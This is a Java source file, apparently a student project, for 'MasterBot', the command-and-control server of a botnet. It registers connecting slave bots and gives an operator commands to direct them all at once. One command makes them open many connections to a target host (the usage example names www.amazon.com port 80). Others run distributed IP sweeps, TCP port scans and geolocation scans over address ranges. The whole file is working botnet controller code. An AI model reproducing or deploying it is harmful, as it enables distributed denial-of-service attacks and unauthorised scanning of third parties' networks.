/* Created by Mengtong Ma ID: 011483056 */

import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;

public class MasterBot{


	public static void main(String args[]) throws IOException{
		if(args.length == 2 && 
		   args[0].equals("-p") &&  // command line argument "p"
 		   Integer.parseInt(args[1]) > 0 && Integer.parseInt(args[1]) < 65536 ){ // 0 < port number < 65536

 		   	ServerSocket serverSocket = new ServerSocket(Integer.parseInt(args[1]));
 		    System.out.println("Ready for connection...");
 		    System.out.print(">");

 		    CommandThread commandThread = new CommandThread();
 		    commandThread.start();

 		    while(true){ 
 		    	// Slave connect to master
 		    	Socket socket = serverSocket.accept();
 		    	ServerThread serverThread = new ServerThread(socket);
 		    	serverThread.start();
 		    }
		}
		else{

			System.out.println("Usage: MasterBot -p PortNumber"); 
		}
	}


}

// Store Slave List in a LinkedList
class slaveList{
    public static List<Socket> sList = Collections.synchronizedList(new LinkedList<>());
    public static List<String> registerDate = Collections.synchronizedList(new LinkedList<>());
    public int count = 0;

    slaveList() {}
}

// Add new salve to the slave list
	class ServerThread extends Thread{
		Socket socket;
		Date dNow = new Date();
		SimpleDateFormat ft = new SimpleDateFormat("YYYY-MM-dd");
		ServerThread(Socket socket){
			this.socket = socket;
		}
		public void run(){
			synchronized(slaveList.sList){
				slaveList.sList.add(socket);
			}
			synchronized(slaveList.registerDate){
				slaveList.registerDate.add(ft.format(dNow).toString());
			}				
		}
	}

// thread to implement command line

	class CommandThread extends Thread{

		private Socket socket;
		private boolean flag = true;
		private String targetIp;
		private int targetPort; 
		private int numberOfConnections;

		public void run(){
			while(flag){
			try{
				//System.out.print(">");
				BufferedReader commandInput = new BufferedReader(new InputStreamReader(System.in));
				String commandLine = commandInput.readLine();
				String[] commandString;
				commandString = commandLine.split(" ");

				if(commandString[0].equals("list")){
					cmdList();
				}

				else if(commandString[0].equals("connect")){
					cmdConnect(commandString);
					
				}
				else if(commandString[0].equals("disconnect")){
					cmdDisconnect(commandString);
				}
				else if(commandString[0].equals("ipscan")){
					//cmdIpScan(commandString);
					Thread ipscan = new IpScanThread(commandLine);
					ipscan.start();
				}
				else if(commandString[0].equals("tcpportscan")){
					//cmdTcpIPScan(commandString);
					Thread tcpscan = new TcpPortScanThread(commandLine);
					tcpscan.start();
				}
				else if(commandString[0].equals("geoipscan")){
					Thread geoipscan = new GeoIpScanThread(commandLine);
					geoipscan.start();
				}
				else if(commandString[0].equals("shut") && commandString[1].equals("down")){
					flag = false;
					System.exit(-1);
				}

				else{

					System.out.println("Invaild input!");
				}

			}catch (IOException e){
					e.printStackTrace();
				}
			}

		}

		// list all current slaves
			private void cmdList(){
			Socket slave;
			if(slaveList.sList.size() == 0){
				System.out.println("There is no Slave connected to the Master.");
			}
			else{

				for(int i = 0; i < slaveList.sList.size(); i++){
					slave = slaveList.sList.get(i);
					System.out.println(slave.getInetAddress().getHostName() + " " 
						+ slave.getInetAddress().getHostAddress() + " " + slave.getPort() 
						+ " " + slaveList.registerDate.get(i));
					System.out.flush();
				}
			}
			System.out.print(">");
		}

		// Establish a number of connections to the target host.
			private void cmdConnect(String[] commandString){
				boolean isFound = false;
				if(commandString.length != 4 && commandString.length != 5 && commandString.length != 6){
					System.out.println("Invalid command!\n" + "Usage: conncet IPAddressOrHostNameOfYourSlave|all\n" 
						+ "TargetHostName|IPAddress TargetPortNumber NumberOfConnections");
					System.out.println("Example: connect all www.amazon.com 80 1");
				}
				else{
					  targetIp = commandString[2];
					  targetPort = Integer.parseInt(commandString[3]);
					  // if(commandString.length == 5){
					  // 	numberOfConnections = Integer.parseInt(commandString[4]);
					  // }
					  // else{
					  // 	numberOfConnections = 1;
					  // }
					  if(commandString.length == 4){
					  	numberOfConnections = 1;
					  }
					  else if(commandString.length == 5 && commandString[4].equals("keepalive")){
					  	numberOfConnections = 1;
					  }
					  else if(commandString.length == 5 && commandString[4].startsWith("url=")){
					  	numberOfConnections = 1;
					  }
					  else{
					  	numberOfConnections = Integer.parseInt(commandString[4]);
					  }
					  
						for(int i = 0; i < slaveList.sList.size(); i++){

							Socket eachSocket = slaveList.sList.get(i);
								
							if(commandString[1].equals("all") || 
								eachSocket.getInetAddress().getHostAddress().equals(commandString[1])||
								eachSocket.getInetAddress().getHostName().equals(commandString[1])){
									isFound = true;
									try{
										OutputStream os = eachSocket.getOutputStream();
										PrintWriter pw = new PrintWriter(os, true);
										String outMessage = commandString[0] + " " + targetIp + " " + targetPort + " " + Integer.toString(numberOfConnections);
										if( ( commandString.length == 6 && commandString[5].equals("keepalive") ) 
											|| (commandString.length == 5 && commandString[4].equals("keepalive")) ){
											outMessage += " keepalive";
										}
										else if( commandString.length == 5 && commandString[4].startsWith("url=")){
											outMessage += " " + commandString[4];
										}
										else if(commandString.length == 6 && commandString[5].startsWith("url=")){
											outMessage += " " + commandString[5]; 
										}
										pw.println(outMessage);
									}catch (IOException e){
										System.err.println("Failed...");
										//System.exit(-1);
									} 
							}  
						}
						if(isFound == false){
							System.out.println("Can not find the SlaveBot at " + commandString[1]);
						}						
					}
					System.out.print(">");

				}
				
				// Close a number of connections to a given host
			private void cmdDisconnect(String[] commandString){
					//System.out.println("disconnect");
				boolean isFound = false;
				String disTargetPort = "all";
				if(commandString.length != 3 && commandString.length != 4){
					System.out.println("Invalid command!\n" + "Usage: disconncet IPAddressOrHostNameOfYourSlave|all\n" 
						+ "TargetHostName|IPAddress TargetPort");
					System.out.println("Example: disconnect all www.amazon.com 80");
				}
				else{

					targetIp = commandString[2];
					if(commandString.length == 4){
						targetPort = Integer.parseInt(commandString[3]);
					}

					for(int i = 0; i < slaveList.sList.size(); i++){

						Socket everySocket = slaveList.sList.get(i);
						if(commandString[1].equals("all") || 
						    everySocket.getInetAddress().getHostAddress().equals(commandString[1])||
							everySocket.getInetAddress().getHostName().equals(commandString[1])){

								isFound = true;
								try{
									OutputStream os = everySocket.getOutputStream();
									PrintWriter pw = new PrintWriter(os, true);
									String outMessage = "";
									if(commandString.length == 3){
										outMessage = commandString[0] + " " + targetIp + " " + disTargetPort;
									}
									else{
										outMessage = commandString[0] + " " + targetIp + " " + Integer.toString(targetPort); 
									}
									pw.println(outMessage);
								}catch (IOException e){
									e.printStackTrace();
									System.exit(-1);
								}

							}
					}
					if(isFound == false){
						System.out.println("Can not find the SlaveBot at " + commandString[1]);
					}

				}
				System.out.print(">");

			}

			// ip scan
			// private void cmdIpScan(String[] commandString){
			// 	boolean isFound = false;
			// 	if(commandString.length != 3 || commandString[2].contains("-") == false){
			// 		System.out.println("Usage: ipscan all 172.217.5.0-10");
			// 	}
			// 	else{

			// 		int range = commandString[2].indexOf("-");

			// 		for(int i = 0; i < slaveList.sList.size(); i++){
			// 			Socket oneSocket = slaveList.sList.get(i);
						
			// 			if(commandString[1].equals("all") || oneSocket.getInetAddress().getHostAddress().equals(commandString[1])||
			// 			   oneSocket.getInetAddress().getHostName().equals(commandString[1])){
			// 			   	isFound = true;
			// 			   	try{	
			// 					OutputStream os = oneSocket.getOutputStream();
			// 					PrintWriter pw = new PrintWriter(os, true);
			// 					String outMessage = "";
			// 					outMessage = commandString[0] + " " + commandString[2].substring(0, range) + " " + commandString[2].substring(range + 1);
			// 					//System.out.println(outMessage);
			// 					pw.println(outMessage);

			// 					BufferedReader fromSlave = new BufferedReader(new InputStreamReader(oneSocket.getInputStream()));
			// 					String validIp = "";
			// 					while( (validIp = fromSlave.readLine()) != null){
			// 						System.out.println(validIp);
			// 					}
			// 					//fromSlave.close();

			// 				}catch (IOException e){
			// 					e.printStackTrace();
			// 				} 

			// 			}						
			// 		}
			// 		if(isFound == false){
			// 			System.out.println("Can not find the SlaveBot at " + commandString[1]);
			// 		}
			// 	}

				
			// }

			// tcp scan
			// private void cmdTcpIPScan(String[] commandString){
			// 	System.out.println("Usage: tcpportscan all");
			// }

								
	}
// ip scan
	class IpScanThread extends Thread{
		String input;
		IpScanThread(String commandLine){
			input = commandLine;
		}

		public void run(){
				String[] commandString;
				commandString = input.split(" ");
				boolean isFound = false;
				if(commandString.length != 3 || commandString[2].contains("-") == false){
					System.out.println("Usage: ipscan all 172.217.5.0-10");
					System.out.print(">");
				}
				else{

					int range = commandString[2].indexOf("-");

					for(int i = 0; i < slaveList.sList.size(); i++){
						Socket oneSocket = slaveList.sList.get(i);
						
						if(commandString[1].equals("all") || oneSocket.getInetAddress().getHostAddress().equals(commandString[1])||
						   oneSocket.getInetAddress().getHostName().equals(commandString[1])){
						   	isFound = true;
						   	try{	
								OutputStream os = oneSocket.getOutputStream();
								PrintWriter pw = new PrintWriter(os, true);
								String outMessage = "";
								outMessage = commandString[0] + " " + commandString[2].substring(0, range) + " " + commandString[2].substring(range + 1);
								//System.out.println(outMessage);
								pw.println(outMessage);

								BufferedReader fromSlave = new BufferedReader(new InputStreamReader(oneSocket.getInputStream()));
								//String validIp = "";
								//ArrayList<String> ipListFromSlave = new ArrayList<String>();
								// while( (validIp = fromSlave.readLine()) != null){
								// 	System.out.println(validIp);

								// 	//ipListFromSlave.add(validIp);
								// }
								System.out.println("Responded IP Address List:");
								String validIpList = "";

								// if( (validIpList = fromSlave.readLine() ) != null){
								// 	System.out.println(validIpList);
								// }

								// while(fromSlave.readLine() == null){
								// 	System.out.println("<");
								// }
								//System.out.print(">");
								System.out.println(fromSlave.readLine());
								//System.out.print(">");
								
							
								//}


								

																// if(ipListFromSlave.size() != 0){
								// 	if(ipListFromSlave.size() == 1){
								// 		System.out.println(ipListFromSlave.get(0));
								// 		System.out.print(">");
								// 	}
								// 	else{}
								// }
								


								

							}catch (IOException e){
								e.printStackTrace();
							} 

						}						
					}
					if(isFound == false){
						System.out.println("Can not find the SlaveBot at " + commandString[1]);
					}
				}
				System.out.print(">");

				
		
		}
	}

	// tcp port scan
	class TcpPortScanThread extends Thread{
		String input;
		TcpPortScanThread(String commandLine){
			input = commandLine;
		}
		
		public void run(){
			String[] commandString = input.split(" ");
			boolean isFound = false;
			if(commandString.length != 4 || !commandString[3].contains("-")){
				System.out.println("Usage: tcpportscan all 172.217.5.0 2000-2100");
				System.out.print(">");
			}
			else{
				int index = commandString[3].indexOf("-");
				String low = commandString[3].substring(0, index);
				String high = commandString[3].substring(index + 1);

				for(int i = 0; i < slaveList.sList.size(); i++){
					Socket masterSocket = slaveList.sList.get(i);

					if(commandString[1].equals("all") || masterSocket.getInetAddress().getHostAddress().equals(commandString[1])||
					   masterSocket.getInetAddress().getHostName().equals(commandString[1])){
					   	isFound = true;
					   try{
					   		OutputStream os = masterSocket.getOutputStream();
							PrintWriter pw = new PrintWriter(os, true);
							String outMessage = "";
							outMessage = commandString[0] + " " + commandString[2] + " " + low + " " + high;
							pw.println(outMessage);

							BufferedReader listFromSlave = new BufferedReader(new InputStreamReader(masterSocket.getInputStream()));
							System.out.println("Port List:");
							System.out.println(listFromSlave.readLine());
							//System.out.print(">");
					   }catch (IOException e){
					   		e.printStackTrace();
					   }
					}
				}
				if(isFound == false){
					System.out.println("Can not find the SlaveBot at " + commandString[1]);
				}
			}
			System.out.print(">");
		}
	}

	//geolocation ip scan 
	class GeoIpScanThread extends Thread{
		String input;
		GeoIpScanThread(String commandLine){
			input = commandLine;
		}

		public void run(){
			String[] commandString = input.split(" ");
			boolean isFound = false;
			if(commandString.length != 3 || !input.contains("-")){
				System.out.println("Usage: geoipscan all 172.217.5.0-172.217.5.10");
				System.out.print(">");
			}
			else{
				int index = commandString[2].indexOf("-");
				String start = commandString[2].substring(0, index);
				String end = commandString[2].substring(index + 1);
				for(int i = 0; i < slaveList.sList.size(); i++){
					Socket clientSocket = slaveList.sList.get(i);

					if(commandString[1].equals("all") || clientSocket.getInetAddress().getHostAddress().equals(commandString[1])||
					   clientSocket.getInetAddress().getHostName().equals(commandString[1])){
						isFound = true;
						try{
							OutputStream os = clientSocket.getOutputStream();
							PrintWriter pw = new PrintWriter(os, true);
							String outMessage = "";
							outMessage = commandString[0] + " " + start + " " + end;
							pw.println(outMessage);

							BufferedReader listFromSlave = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
							//System.out.print(listFromSlave.readLine());
							String location = listFromSlave.readLine();
							//System.out.println(location);
							if(location.contains(";")){
								String locationList = location.replace(";", "\n");
								System.out.println(locationList);
							}
							
						}catch (IOException e){
							e.printStackTrace();
						}
					}
				}
				if(isFound == false){
					System.out.println("Can not find the SlaveBot at " + commandString[1]);
				}
			}
			System.out.print(">");
		}
	}




